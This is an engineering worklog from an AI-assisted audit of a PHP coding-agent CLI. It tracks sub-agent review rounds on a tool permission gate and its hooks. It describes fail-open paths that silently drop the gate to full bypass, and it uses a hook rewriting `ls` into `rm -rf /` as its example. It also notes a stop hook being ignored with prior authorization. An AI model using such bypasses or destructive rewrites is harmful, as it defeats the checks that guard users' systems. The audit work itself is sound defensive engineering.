# crush_code.md execution worklog

Resumable state for the `crush_code.md` audit remediation. `crush_code.md` (repo
root, committed `418c0888`) is the authority: lines 1-203 are the Executive
Summary + Implementation Plan, 209-2160 are the 13 research dossiers.

**Last updated:** 2026-08-13, after P1.1 committed (`15de96a5`).

---

## The loop (per step, one at a time — never in parallel)

1. Spawn an agent to implement the step.
2. Spawn a **separate** agent to adversarially review the diff.
3. Findings → spawn a fix agent → **go back to 2**.
4. No findings → run the full suite → **commit directly to master** → next step.

Cap ~2 review rounds per step unless a blocker is still open. Scale reviewer
depth to risk: light for mechanical steps (docs, renames, env tables), deep
adversarial for wiring-heavy ones (P1.1, P1.2, the P2 wiring, P3.1 TextInput).
Good reviewers demonstrate findings with runnable repros; returning CLEAN is an
acceptable outcome. Build tests out as you go.

## Standing rules

- **Never delete a feature because it looks incomplete or dead** — complete it,
  wire it, or document it as an intentional dormant seam. The audit contains
  several "delete this" recommendations from its own research agents that were
  explicitly overridden for this reason. Move/consolidate is fine; removal is not.
- Commit directly to `master`. No branches, no PRs. Author
  `Joe Huss <detain@interserver.net>`, trailer
  `Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>`.
- **Do not run `caliber` anything.** A stop hook nags every turn; that is
  expected and pre-authorized to ignore. There is no pre-commit hook installed.
- Separate commits per distinct concern where the seams allow it; lump only when
  they genuinely do not. Split a mixed file by hunk (`git apply --cached`) rather
  than lumping.
- Conventions: `declare(strict_types=1);` first line, PSR-12, PHP 8.3+, `final`
  unless extension is the contract, immutable+fluent `with*()` via `mutate()`,
  bare accessors (no `get`), `::new()` factories, comment WHY not WHAT.
- Never add a blanket total-request timeout to a provider HTTP client — LLM
  completions can legitimately run tens of minutes. Short `connect_timeout` only.
- Stale per-lib `vendor/`/`composer.lock` cause false local failures —
  `composer update` in that lib before believing one.
- Bash cwd does NOT persist between calls — anchor absolute paths or chain.
- Run sub-agents **one at a time**; concurrent writes collide.

## Do not touch

- `McpClientTest::testLoadConfigReturnsEmptyArrayWhenFileGetContentsFails` — the
  1 legitimate skip.
- `docs/plans/plans_cleaning.md` — untracked, unrelated pre-existing work.
- The lib is not `php-cs-fixer`-clean repo-wide (999 files dirty at baseline);
  do not normalize unrelated files.

## Verification baseline

- Full suite: `cd /home/sites/sugarcraft/sugar-crush && vendor/bin/phpunit`
- **Current: 5196 tests / 16091 assertions / 1 skipped / 0 failures**, ~2:22.
- Test-count arithmetic: `BinSugarcrushWiringTest::crushSourceFiles()` is a
  `@dataProvider` scanning all of `src/`, so **each new `src/` file adds exactly
  1 test**. Account for it when reconciling deltas.
- `phpunit.xml` has `failOnWarning="true"`; `tests/bootstrap.php` sandboxes the
  IPC sweep, exports `TMPDIR`, and pins the event loop (see below).

---

## Completed

| Step | Item | Commit |
|---|---|---|
| — | audit + plan | `418c0888` |
| 1 | P0.1/2/8/9 tool-layer hardening | `849668b7` |
| 2 | P0.3 CLI flag fall-through | `cbe2eb8a` |
| 3 | P0.4/5 connect_timeout + child reaps | `1ec71f73` |
| 4 | P0.6/7 `--root` threading | `e8195263` |
| 6 | P0.10 one-shot provider hard-fail | `90a4b2af` |
| 7 | P0.11/12 checkpointing + session index | `37a5defd` |
| 8 | P0.13 real token streaming | `89429363` |
| — | `SkillRegistry` numeric-key TypeError | `a8d999a7` |
| — | forked-tool IPC payload leak | `e23da929` |
| 9 | P0.14 parallel tool calls | `94c45e93` |
| — | test loop pinned to `StreamSelectLoop` | `19fb6232` |
| 10 | P1.1 real `AgentManager` | `15de96a5` |
| — | concurrency lane map (this doc) | `6203a0e2` |
| — | extract `Edit`'s diff builder into a trait | `597ee859` |
| 44 | P8.12 `Write` tool (**not yet registered**) | `9dbc5f8e` |
| 24a | P4.4 `SUGAR_CRUSH_*` rename + shim | `ff6debba` |
| 24b/48 | P4.3 `--version` + flag-shaped prompt value | `7590ae0d` |
| 52 | Team tests leaking into the real `~/.sugar-crush` | `91467884` |
| 53 | `ChatTest` leaking IPC payloads into the real `/tmp` | `00b3e963` |
| 50 | `BedrockProvider` control plane → runtime plane | `a01b62b9` |
| 41 | P8.7 `.gitignore`-aware `Glob`/`Grep` | `c4a90a12` |

### #11 (P1.2) review outcome — NOT yet committed

Implementation is in the tree, reviewed, and **must not commit as-is**. The
review verified 6 of 8 implementer claims, disproved 1, and found the hang is
**not** caused by this change (see below). Outstanding work:

- **F1 blocker.** `Bootstrap::permissionGate()` reads via `readUserConfig()`,
  which returns `[]` on ANY parse/read failure — so a strict config with one
  trailing comma, or mode 0000, or an env typo (`paln`, `Plan`, `deny-all`)
  silently downgrades to full bypass with **nothing on stderr**. Demonstrated
  across 6 config variants. Fix is one `fwrite(STDERR, …)`, matching the
  precedent already in `Bootstrap::backend()` (`:454`, `:468`), same file.
- **F2.** "Strictly more guarded than before" is **false** — it is exactly
  *equal*. Verified over 11 tool calls and 20 destructive `rm` variants:
  `bypass-permissions` is byte-identical to no-gate, because `ConfirmRemoveHook`
  already denied every one and the default rule set is empty. Asserted in 4
  places: the `permissionGate()` docblock, `BootstrapPermissionGateTest:75-77`,
  `PermissionGateHookTest:89-92`, and the README bullet.
- **F3.** 10 of 13 sabotages went red; **3 stayed green**. Worst is S12:
  deleting the gate registration from `Bootstrap::hooks()` breaks nothing —
  `Chat::gateToolCall()`, the second live tool path, could silently lose the
  gate. Also S8 (a malformed rule coerced to Allow is indistinguishable under
  `bypass`; move that assertion to `plan` mode and it bites) and S13 (the
  "ONE gate per launch" circuit-breaker sharing is untested).
- **F5.** A MODIFY hook short-circuits `HookRegistry::executeHooks()` before
  the gate runs, because the gate is registered last and `executeHooks()`
  returns on the first `isModified()`. Latent today, but this change is what
  makes MODIFY reachable from config via `exit 4`, and #15 wires `hooks.yaml`.
  Fix belongs in `executeHooks()`: MODIFY should carry its rewrite and continue
  the scan, like ALLOW, so a later DENY still wins.
- Minor: F7/F8 (`exit 4` with `[]` runs the tool with zero args; a numerically
  keyed JSON object is falsely denied — both fail-safe), F9 (`ScriptHook` reads
  stdout then stderr sequentially, so >1 pipe buffer on stderr deadlocks —
  pre-existing but newly more reachable), F10 import ordering, F11 temp-dir leak.

**USER DECISION (2026-08-14): fix the ASK path at the root**, rather than
keeping the permissive default or defaulting-and-warning. Make
`EngineBackend::completeAsync()`'s existing one-way frame socket
request/response so an ASK can reach the TUI from inside the forked child,
then default to a real mode. Overlaps #55's fork-IPC extraction — decide
whether it lands there. Note the reviewer's correction: ASK fails closed today
because **nothing anywhere attaches an approver**, not because of the fork;
`withPermissionApprover()` has no caller outside its own test.

**#57 (new, from #50's audit): `VertexProvider` `predict()` vs `rawPredict()`.**
Same family as the Bedrock bug but it does NOT fail at the SDK boundary —
`predict()` really exists, so it resolves and fails *server-side* against an
Anthropic publisher-model path, which is served by `rawPredict`/
`streamRawPredict`. `parseResponse()` also decodes protobuf `Value`s where
`rawPredict` returns a raw `HttpBody`, and `new $clientClass(['projectId' =>
…])` is silently ignored by gax's fixed-key `ClientOptions::fromArray()`, with
`apiEndpoint` never set. Invisible today because the default predictor is a
lazy closure every unit test replaces. **Test it the way #50 was tested — do
not mock the client**; a double is precisely how the Bedrock bug survived 30
tests. Queue: lane X, near the end.

(Step 5 folded into step 1. **Phase 0 is complete.**)

**`Write` is committed but deliberately unregistered.** `Bootstrap::tools()` gets
its one-line registration only once #11 lands — that change adds `Write` to
`PermissionGate::isWriteTool()`, and registering first would ship a write tool
that skips write-gating. Do not forget this line; the feature is inert without it.

## In flight

- **#52 + #53** — test-hygiene leaks. Agent running. Two independent
  change-sets, to be committed separately.

## Concurrency map — lanes, ownership, and the real constraint

The plan claims items within a phase are "file-disjoint or near enough". **That
is wrong for Phase 2 and Phase 4.** Almost every P2 item funnels through
`src/Cli/Bootstrap.php` (1102 lines, 28 static methods) and half of P4 funnels
through `Chat::submit()`'s dispatch chain (`src/Chat.php`, 5672 lines). Those
two files — not the phase boundaries — are what actually serializes the work.

Concurrency here is **same-tree with enforced file ownership**, not git
worktrees. Worktrees are a trap for this repo: `vendor/` is gitignored, and a
symlinked `vendor/` resolves `$vendorDir` from its realpath, so composer's PSR-4
map silently autoloads `src/` from the MAIN tree — an isolated worktree that
quietly tests the wrong code. A real `composer install` per worktree also breaks
the `../candy-*` path repos. So: one tree, disjoint lanes.

### Lane ownership (a file has exactly ONE owner at a time)

| Lane | Owns | Items |
|---|---|---|
| **W** wiring (critical path) | `Cli/Bootstrap.php`, `Chat.php`, `Backend/EngineBackend.php`, `MCP/`, `Workflow/`, `Hooks/`, `Permissions/`, `Skills/`, `Commands/`, `Context/ContextCompactor.php`, `Config/` | #11 #12 #13 #14 #15 #16 #18 #22 #23 #28 #31 #32 #33 #38 #47 |
| **U** UI | `Tui/`, `Tui/Components/`, `Renderer.php`, themes, `.vhs/` | #19 #20 #21 #25 #37 #39 #40 |
| **T** tools | `Tools/`, `Tools/BuiltIn/`, `LSP/` | #17 #41 #44 #45 #46 + #43's Grep half |
| **P** prompt/context | `Runtime.php`, `Context/EnvironmentBlock.php`, `Context/InstructionFileLoader.php`, `App/App.php` | #27 #30 #42 + #43's loadRoot half |
| **X** CLI + isolated + cross-lib | `Cli/ArgvParser.php`, `Cli/NonInteractive.php`, `bin/sugarcrush`, `Cli/Help.php`, `Providers/`, `Agents/WorktreeManager.php`, `Commands/ShareCommand.php`, **candy-core**, **candy-testing** | #24 #26 #48 #50 #54 #55 #56 |
| **D** docs | `README.md`, `sugar-crush/docs/`, repo `docs/_data/`, `docs/lib/` | #34 #35 #36 |

### Hard sequencing (real, not stylistic)

- #11 → #15 (`ScriptHook` needs `ask`/`modify` exit codes before a discovered
  hook config can do anything) and → #33 (a settings `permission` block before
  `PermissionGate` reaches the main loop is just a second decorative surface).
- #31 (P6.2 layered settings) → #32, #33, and the config-path half of #12.
- #12 (`McpClient` rename) → the `Bootstrap::mcpClient()` half of #12 itself,
  and → #47.
- #12–#17 → #47 (the plugin-manifest epic is their consolidation).
- #10 ✅ already unblocks #39, #40, #45.
- #24 (`SUGAR_CRUSH_*` → `SUGARCRUSH_*`) → D's ENVIRONMENT.md, or the table
  documents names that are about to change.
- #55: its **candy-core build phase is fully parallel** (different lib), but its
  **sugar-crush adapter phase needs an exclusive lane-W window** — it rewrites
  fork sites in `Chat.php`, `Runtime.php`, `EngineBackend.php`.

### Shared-file collisions and their rules

1. **`Bootstrap::tools()` one-line registrations** — #17 (Lsp), #44 (Write),
   #45 (Task), #32 (allow/deny filter). Lane T builds and tests each tool
   standalone; the registration line is applied by the supervisor at commit
   time. Lane T never edits `Bootstrap.php`.
2. **`sugar-crush/composer.json`** — #18 wants `sugar-bits`/`candy-forms`, #19
   wants `candy-focus`, #21 wants `candy-kit`. `candy-sprinkles`, `sugar-veil`
   and `candy-mouse` are **already required**, so #20 and #3.3 need no dep work.
   Add all three missing deps in **one prep commit** before U or W reach them.
3. **`README.md`** — #11 (permission bullet), #24 (env table), #34–#36. Lane D
   owns it exclusively; other lanes file requests rather than editing.
4. **`Cli/Help.php`** — #24 (`--version`) then #21 (candy-kit restyle), in that
   order.
5. **`Runtime.php`** — lane P owns it; #55's adapter phase must wait for a
   quiet window.

**Sixth hazard, found the hard way (2026-08-14): reads cross lanes even though
writes do not.** Lane D documents behaviour by reading source, and in wave 1 it
read lane W's *uncommitted, unreviewed* P1.2 work mid-flight — then documented
`PermissionGateHook`, `ScriptHook` exit codes and `SUGARCRUSH_PERMISSION_MODE`
as shipped fact. Ownership stops lanes clobbering each other; it does **not**
stop a docs lane from describing code that has not passed review and may still
change. Rule: **lane D's pages covering an in-flight lane's subject matter are
re-verified after that lane's review closes**, before its commit lands.

### One fresh agent per step — never a reused one

Every step gets a **brand-new agent**, and so does every review and every fix
round. A lane is a file-ownership boundary, **not** a long-lived agent: lane W
running six items in sequence means six separate implementer agents, not one
agent handed six tasks. The step-N agent never sees step-N-1's context.

Why it matters here: these agents burn 120k-170k tokens on a single step. A
reused agent starts step 2 already loaded with step 1's dead exploration, gets
slower and more expensive per step, and eventually degrades or dies mid-task
(exactly what killed fix agent `a52cbd14be2ca48f0` on 2026-08-13). A fresh
agent also cannot rationalize its own earlier work, which is the whole point of
the separate reviewer.

Reuse (`SendMessage` to a still-live agent) is legitimate for exactly one case:
answering a clarifying question or handing back review findings **within the
same step**, where its existing context is the asset. Never to start new work.

### Verification protocol under concurrency

- Sub-agents run **targeted tests only** (`--filter`, or a single test dir).
  **No agent runs the full suite** — 8 concurrent full-suite runs is what
  stretched a 2:22 suite to 13 minutes on 2026-08-13.
- The supervisor runs the full suite serially, once per commit gate.
- Commit with an **explicit path list** (`git add <paths>`), never `git add -A`
  — the tree legitimately holds several lanes of uncommitted work.
- Reviewers get a **lane-scoped diff** (`git diff -- <lane paths>`), so they do
  not flag a neighbouring lane's in-progress work.
- A red full-suite gate names the culprit by lane via test-file ownership.
- **Lint before every gate run.** Any lane's half-written `src/` file poisons
  every other lane's tests, because `ToolSchemaEncodingTest`'s dataProvider
  constructs every built-in tool and autoloading pulls in whatever is mid-edit.
  Seen for real: a gate died with `syntax error, unexpected token "final"` in a
  brand-new `src/Tools/IgnoreRules.php` another lane was still writing. Sweep
  `php -l` over `git status --porcelain` first and retry rather than
  investigating a phantom regression.
- **Cap concurrency at 2 agents** when session context is tight (set 2026-08-14
  at 75% usage), then **1 agent** at 80%. Lanes are cheap to pause between
  steps and expensive to restart mid-step, so throttle by not *starting* the
  next step, never by killing a running one.
- **Current setting: 1 agent at a time.** The supervisor's own context is the
  scarce resource, not the machine — each returning agent costs 2-5k tokens to
  read, verify and commit. When the cap is 1, the single slot goes to whatever
  is on the critical path (#11's review), and the other lanes simply idle with
  their work already committed. Raise the cap again after a compact.

This deliberately overrides the repo's blanket "run sub-agents ONE AT A TIME"
rule. That rule exists because concurrent writes to `MATCHUPS.md`/`README.md`
collide; enforced file ownership addresses the same hazard directly, and lane D
holding `README.md` exclusively preserves the original rule's intent.

## Queue

**Wave 1 (concurrent):** W #11 · X #24 · T #44 · D #34.
Fillers when a lane goes idle: #50 (BedrockProvider, one file, fully isolated),
#49 (verify-and-close), #46, #56.

Then: W #16 → #12 → #13 → #14 → #22+#23 → #15 → #31 → #32 → #33 → #28 → #38 →
#18 → #47. U #37 → #25 → #19 → #39 → #40 → #21 → #20. T #41 → #46 → #17 → #45.
P #27 → #30 → #42. X #48 → #56 → #55 → #54 → #26. D #36 → #35 (hold MCP.md /
PERMISSIONS.md / HOOKS.md until #12 / #11 / #15 land).

---

## Findings worth not losing

### The ExtUvLoop stale-clock trap (`19fb6232`, task #56)

`Loop::get()` returns `ExtUvLoop` where ext-uv is installed. libuv computes a
timer's deadline against the loop's **cached** clock, refreshed only inside
`uv_run()`. PHPUnit runs the loop in short bursts with long synchronous stretches
between, so a timer armed for 10s against a 10s-stale clock is already overdue
and fires on the **first tick** — `run()` returns immediately and the test fails
having consumed no wall time. Effective delay = `delay - idle_since_last_run`
(8s idle → 2.0013s; 10.5s → 0.0002s).

Caused a **33% failure rate** (2-in-6, on baseline as well) in
`BinSugarcrushWiringTest`, `StreamingWiringTest`, `SystemPromptWiringTest`.
An earlier diagnosis blaming a stale `$loop->stop()` handler was **wrong**;
instrumenting `ExtUvLoop::run()/stop()` predicted 12 of 12 runs from the idle gap.
Fixed by pinning `StreamSelectLoop` in `tests/bootstrap.php`. 8/8 green after,
at no time cost. Production is immune because `Program::run()` drives one
continuous `uv_run()`.

**Other libs are plausibly flaking for this reason** — candy-query, candy-wish,
candy-pty, candy-mosaic. Signature: intermittent failure consuming no wall time.

### New evidence for #54, the intermittent hang (2026-08-14)

`vendor/bin/phpunit tests/Tools tests/Providers tests/Integration` **hung** —
14:20 elapsed for 11s of CPU, state `S`, no children, killed. Run separately
immediately afterwards, all three are green and fast: Tools 325 tests/1.75s,
Providers 491/0.53s, Integration 433 (under 90s). So it is not a broken test.

It hung while two *other* full suites were running concurrently (a subagent
that predated the no-full-suite rule). Reproduction lever: run the fork-heavy
integration tests under CPU contention, not in isolation.

**Ruled out as the cause: P1.2.** A pre/post A/B under load average 107 (48
cores) completed on both trees; the only asymmetry was the *pre-change* tree
flaking twice in `ParallelToolCallsTest`. `Runtime.php` and `Chat.php` — where
every fork, socketpair, WNOHANG poll and loop suspension lives — are untouched
by P1.2, and `settleAsk()` returns `deny` immediately on a null approver (77
real `Runtime::gate()` calls, 22 of them ASKs, under a second).

**Best-supported suspect: P0.14's parallel-tool fork machinery** (`94c45e93`).
The signature — state `S`, ~11s CPU over 14 min, no children — fits a 2 ms
WNOHANG poll loop whose exit condition never trips, and
`Runtime::PARALLEL_TOOL_POLL_MICROSECONDS` is exactly such a loop. **Next time
it hangs, capture `ls -l /proc/<pid>/fd`, `cat /proc/<pid>/syscall` and
`cat /proc/<pid>/wchan` before killing it** — that settles it in one shot.
Still argues #55 should subsume #54.

### Why P1.1's `AgentManager` is "live" but sub-agents do not run

Nothing in `src/`/`bin/` calls `createSubAgent()`/`executeSubAgent()`, there is
no Task tool, and `WorkflowEngine` is never constructed. So `/agents`, `/agent`
and Ctrl+A work, but the agent strip and dashboard rows are **reachable and not
yet populatable**. That is P8.13 (#45) and P2.3 (#13), not a P1.1 defect.

### Carried into #11 (P1.2)

`AgentManager::evaluateToolCalls()` turns `PermissionDecision::Ask` into a hard
`RuntimeException`, so `PermissionMode::Auto`'s 3-strike escalation-to-Ask is a
dead end for sub-agents. Verified byte-identical to baseline — pre-existing, not
introduced by P1.1. `PermissionGate` is now reachable for the first time.

### Design overrides made on the user's behalf (both stated at the time)

- Session retention made **opt-in** (default `0`): a destructive opt-out default
  resting on a signal that fires at most once and fails silently is not defensible.
- "No prompt given" moved from exit 1 to exit **2** (pre-1.0, no tagged release).

### Deliberately dormant, documented, not deleted

- `AgentWorkerPool::waitForCompletion()`'s blocking `usleep()` and
  `AgentPoolConfig::$maxRetries` — `Chat::executeAgents()` has zero callers, so
  nothing reachable drives them. Re-verify before assuming still true.
- `AgentManager::liveOutputs()` — awaiting P8.4's split-pane compositor.

### #55 scope (user-confirmed: candy-core, consolidate broadly)

Seven hand-rolled `pcntl_fork` sites in sugar-crush (`Chat`, `Runtime`,
`EngineBackend`, `WorkflowEngine`, `AgentWorkerPool`, `BackgroundSessionRunner`,
`BackgroundSupervisor`, plus `Support/ForkedChild`). Bugs found in three — the
same class each time.

candy-core, **not** candy-async: candy-async requires candy-core and sugar-crush
does not depend on it; candy-core already owns `WorkerPool`,
`Util/Tty/PosixBackend` (forks) and `Program.php`; candy-async is
cooperative/promise/loop-resident and this primitive runs where there is **no
loop**.

A **sibling** of `WorkerPool`, not a replacement — `WorkerPool` is `proc_open` +
serialized closures + loop-driven and needs a running loop. Name them so the
loop-driven vs loop-free split is obvious at the call site.

Moves up: the "never `waitpid(-1)`" pid-ownership invariant (process-global,
today enforced only by comment); fork/collect/reap with deadline + SIGKILL +
bounded reap + orphan policy; IPC payload files (`Support/ToolIpcFiles` — 0600
via umask narrowed around the create, atomic `.partial`+rename, lstat-based
age sweep); the "a forked child must not inherit the parent's loop" contract +
detach helper; fd hygiene/CLOEXEC (inherited socketpair delays parent EOF by a
measured 3.21s).

Stays in sugar-crush: `Tools\ParallelSafe` segmentation policy, permission
gating order, `CarriesSessionState` announce-once merge.

Approach: survey the seven call sites first so the API is derived from them;
build in candy-core with tests; convert sugar-crush to thin adapters one at a
time with the suite green between each; deep adversarial review because 52 libs
sit on candy-core. Design goal — **the safe path must be the easy path**, or the
eighth call site hand-rolls too.

---

## P1.2 — review round 2 outcome (2026-08-14)

**Verdict: do not commit. 1 blocker-grade residual + 4 majors, all reproduced
end-to-end (not inferred). Fix round 2 dispatched.**

Working tree restored by the reviewer; full suite re-verified at
**5500 tests / 16959 assertions, 0 failures, 1 skip** (the known `McpClientTest`).

### The F1 claim was still false for two inputs

The fix round closed the *file* cases and left two open, in a way that inverted
the docblock's own promise — an unreadable **file** hard-fails, an unreadable
**directory** silently bypasses.

1. **Unreadable config directory.** `permissionConfig()` gates on `is_file()`,
   which is `false` when the *parent dir* is unsearchable, so it takes the
   "nothing configured" branch. `chmod 000 ~/.sugar-crush` turns `plan` into
   `bypass-permissions`, exit 0, nothing on stderr. Reachable via a different
   euid, `sudo` without `-E`, or an NFS/autofs blip.
2. **Top-level JSON list.** `is_array($data)` cannot tell `{}` from `[]` — the
   *identical* defect F7/F8 had just fixed in `ScriptHook` by testing the JSON
   **text**. The error string "the top level is not a JSON object" names a
   branch that can never fire for a list, and the test that "covers" it passes
   for the wrong reason (it uses the scalar `"plan"`, which `is_array()` does
   catch).

**Lesson worth keeping:** the same defect class appeared twice in one
change-set and was only fixed at one of the two sites. When a fix round
establishes a recipe, grep the whole change-set for the pattern.

### Majors

- **F9's `drain()` regressed what it fixed.** `stream_select()` is not restarted
  under `SA_RESTART`; candy-core's `Program.php` enables
  `pcntl_async_signals(true)` with SIGWINCH/SIGINT handlers, so a terminal
  resize mid-hook returns `false` and the loop `break`s, abandoning unread
  output. Measured: new `drain()` → `'AAAA'`, old `stream_get_contents()` →
  `'AAAABBBB'`. Fails closed on the verdict but truncates deny reasons,
  `exit 3` questions, and `exit 4` rewrites. The deadlock fix itself is real
  (sabotage **hung** past 90s).
- **Empty/whitespace `config.json` bricks the CLI**, and `writeUserConfig()` is
  a non-atomic `file_put_contents()` that can *create* that state on SIGINT,
  OOM, or a full disk. Needs temp-file + `rename()`.
- **"One gate per launch" survives until the first Ctrl+P.**
  `Chat::selectPaletteProvider()` calls `backendFor()` with no gate, so the
  engine gets a fresh instance. In `auto` mode the 3-strike counters are
  per-instance, so a provider switch resets the breaker — a model at 2 strikes
  gets a clean slate. The test pins the invariant only at construction.
- **F5 closed half the MODIFY hole.** `Runtime::gate()` applies `modifiedInput`
  without re-running the chain, and the gate is registered last, so it only
  ever sees pre-rewrite arguments: a hook rewriting `Bash{ls}` →
  `Bash{rm -rf /}` is evaluated by everything against `ls`. Correct for the
  *verdict*, wrong for the *arguments*.
- **`backendFor()`'s gate wiring is untested** — deleting the
  `withPermissionGate()` line leaves `tests/Cli/` green at 260/260. That is the
  path for every `SUGARCRUSH_PROVIDER` run and every one-shot `-p`.

### Confirmed resolved by sabotage

F2 (prose re-derived true: `ConfirmRemoveHook`'s regexes strictly subsume the
gate's breaker across all six `rm` spellings, and it runs first), F3 (all three
gaps now bite), F7/F8, F10/F11. F5 and F9 are *partial* — real fixes with
residuals.

### Dormant-seam notes (do not delete — complete or document)

- `HookManager::loadFromFile()` has no caller in `src/` or `bin/`, so the
  `exit 3`/`exit 4` contract is reachable only by an embedder today.
- `permission-gate` is not a reserved hook name; once `loadFromFile()` is wired
  a YAML entry of that name silently **uninstalls** the gate.
- `EngineBackend::completeAsync()` forks, so gate strike counters die with the
  child — the "one gate, one counter" comments lean on state that never
  survives a turn. Fold into the ASK-path/fork work, not here.
- `agentManager()`'s gate factory reads config lazily, so a config broken after
  launch throws mid-TUI where the only handler would `exit(2)` with the
  terminal still in alt-screen/raw mode. Dormant until `/agents` dispatches.

### Concurrency state

Back to 3 lanes. Lanes chosen for **file-disjointness from P1.2**, not plan
order: most of the queue blocks on `Bootstrap.php` (registration) or
`NonInteractive.php`/`bin/sugarcrush` (both modified by P1.2).

New agents are fenced out of `src/Tools/BuiltIn/*.php` while any review lane is
running tests: `ToolSchemaEncodingTest`'s data provider autoloads every built-in
tool, so a half-written file there fails *another lane's* run with a parse error
that reads as a real defect.

Housekeeping: 480 stale `/tmp/bootstrap_permission_gate_*` fixture dirs (Aug 13,
pre-F11-teardown) removed; current teardown verified clean.

---

## Session handoff (2026-08-14, before a client restart)

### Committed this session

| SHA | Item |
|---|---|
| `e1881baf` | **#57 VertexProvider** — 4 defects + a 60s total-request cap |
| `9d92bb5a` | **#46 P8.14/15 PathJail** — turned out to be a security fix |
| `64191566` | worklog: P1.2 round-2 findings |

Both code commits were verified **personally**, not on report: the Vertex
call-site tripwire (strip `callOptions()` → 6 failures, restore → 578 green) and
the PathJail NUL guard (neuter `unusable()` → 7 errors, restore → 1160 green).

### UNCOMMITTED and needing review round 4: P1.2

Fix round 3 closed everything round 3 raised, and the suite is green
(P1.2 scope **944 tests / 2214 assertions**; agent reported whole-suite
**5677 / 17534 / 1 skip**). It is held back deliberately, because two fixes grew
**new surface in the permission path**:

- **`HookDispatcher` was WIRED** to `HookRegistry::executeHooks()`'s re-scan
  contract rather than documented around — a *second* re-scan loop with its own
  fixed-point settle and `MAX_REWRITE_PASSES` block. The right call (a docblock
  does not survive the day someone routes `PreToolUse` through it) but it is
  machinery, not a comment.
- **`Runtime::gate()` now returns a third element** and `Chat::applyRewrite()`
  returns a tuple, threaded through `executeSequentially` **and**
  `executeConcurrently`, so `PostToolUse` observes what actually ran.

Every round so far has found something, and the carrying-ASK bug came from
exactly this shape — a fix that quietly grew surface. Round 4 should focus
there, plus re-confirm the 8 round-3 sabotages (the agent re-ran all 8 red).

**Fixed in round 3, for the reviewer's context:** the approver was being shown a
different call than would run (`settleAsk()` now applies the carried rewrite via
`asAsked()`, deliberately separate from `rewrittenArguments()` because that one
gates on `isModified()` and an ASK's rewrite rides on an `ASK` action); a
symlinked config dir re-opening the F1a fail-open (`unreachableAncestor()` with
an `is_link()` probe — which also catches `HOME` *itself* being a symlink, a case
the narrower suggested fix missed); and a trailing-slash `HOME` silently
disabling **all** config persistence (a regression from the atomic-write fix).

**Commit groups (agent's, land 1 before 3 — both touch `Runtime.php`):**
1. approver-shown fix — `Runtime.php` + `RuntimeTest.php`
2. symlink fail-open + non-canonical HOME + BOM message — `Cli/Bootstrap.php` + its test
3. PostToolUse sees what ran — `Runtime.php` + `Chat.php` + both tests
4. HookDispatcher re-scan — `Hooks/HookDispatcher.php` + new test
5. two comment corrections — `Sessions/BackgroundSessionRunner.php` + `bin/sugarcrush`

`README.md` carries hunks from **three** lanes — use `git add -p`, never a
whole-file add.

### UNCOMMITTED: UI #37 (P8.1 diff gutter + P8.5 adaptive theme)

Reviewed; in a fix round for a **real render-invariant break** (the PR #1403
class): `Width::string("\t") === 0` but candy-sprinkles' `Style::render()`
paints a tab as 4 spaces, so a Go/Makefile diff at `cols: 40` emits 48-cell
rows. Pre-existing, but the gutter amplifies it by its own width. Also fixing a
latent float→`TypeError` inside `view()` (would kill the Program with the
terminal in raw mode) and `-- ` SQL/Lua comment content misread as a file header.

P8.6 (VHS) deliberately deferred. `TerminalBackground::observe()` is a dormant
seam with verified-correct wiring instructions for `App/App.php`.

### Queued follow-ups found by the review chain

#58 Bedrock streaming discards its connect bound · #59 stale
`ProviderConnectTimeoutTest` exemption · #60 `ScriptHook` has no execution
timeout (a hook that never exits wedges the CLI; **pre-existing**, deliberately
excluded from the security fix) · #61 P1.2's unsearchable-dir tests assert a
throw **root does not produce** — fine locally (uid 1000) but CI containers
often run as root.

Also flagged by round 3, not queued yet: `HookManager::applyPreHooks()` is the
same stale-`toolArgs` family as `HookDispatcher` was, and `ToolStarted`/
`ToolFinished` still carry the pre-rewrite `ToolCall` on both pipelines.

### Method note that keeps paying

Have the fix agent report *which sabotages stay green*, and re-run them myself
before committing. Three separate green sabotages this session marked real
coverage holes — Vertex's `callOptions()` call sites, Vertex's regional
`apiEndpoint` (half the original bug, untested), and PathJail's NUL guard.

### Handoff update — UI #37 landed

`4e10360b` — **P8.1 + P8.5 committed.** Verified personally: tab-expansion
sabotage → 1 failure, restored → **803 tests / 14218 assertions** green.

Committed rather than sent to review round 2 because, unlike P1.2, the new
surface is small, internal, and cosmetic-or-crash rather than security. Two
things raised confidence: the agent **corrected its own over-report** (the
54-cell row at `cols=40` was the status bar, an unrelated pre-existing
over-emit, not the diff box), and it reported that its **own first sabotage came
back green** — narrowing `SEPARATOR` didn't fail because `format()` reads the
same constant, so it re-ran with a fullwidth separator to prove the
`Width::string` change is genuinely load-bearing.

Two judgement calls it made that I'd have made: it declined to bound the hunk
regex to `\d{1,9}` (an unrecognised `@@` falls through to the context branch, so
a bounded regex would let the *previous* hunk's counters keep advancing — trading
a crash for silently wrong numbers) and instead opted out of *numbering* only.
And it fixed `styleDiffLine()`'s twin ambiguity rather than documenting it,
because leaving it would have made the gutter say "deleted line" while the colour
said "file header" **on the same row** — a new inconsistency created by its own
fix.

**P8.6 (VHS) remains open** on #37. Also left: `TerminalBackground::observe()`
is a dormant seam needing two additive `App/App.php` edits, and candy-shine's
`lineNumbers: true` must NOT be flipped until candy-shine has a measurable
separator — it joins its gutter with a literal tab and would reintroduce
over-wide rows in every markdown code fence.

### State at pause

Working tree carries **only P1.2** (plus the pre-existing untracked
`docs/plans/plans_cleaning.md`, `sugar-crush/docs/`, `sugar-crush/python_port/`
and the lane-D docs edits). P1.2 is green at **944 / 2214** in its own scope and
awaits **review round 4**, focused on `HookDispatcher`'s second re-scan loop and
`Runtime::gate()`'s third return element.

---

## Session resume — lane-D docs reviewed, held; three lanes running

### Lane-D docs (#34) — reviewed by the supervisor, NOT ready to commit

Reviewed directly rather than delegated: it is 140 lines of `ENVIRONMENT.md`
plus the `docs/_data/sugar-crush.{json,body.html}` pair, small enough that a
round trip would have cost more than it bought.

**What checks out:**

- `php tools/gen-docs.php --check` → *ok: all 58 pages + index.html counts match
  generated output*. So `docs/lib/sugar-crush.html` really is generated from the
  data store, not hand-edited — the one structural rule for that file.
- Every environment variable named in `ENVIRONMENT.md` exists in `src/` or
  `bin/`. Cross-checked by extracting `(SUGARCRUSH|SUGAR_CRUSH|CRUSH)_[A-Z0-9_]+`
  from both sides and diffing: **zero documented-but-nonexistent** variables.
- "Seven providers" and the `SUGARCRUSH_PROVIDER` accepted-value list match
  `ProviderFactory::available()` exactly (`src/Providers/ProviderFactory.php:203`).
- "12 built-ins" matches `ls src/Skills/BuiltIn | wc -l` → 12.
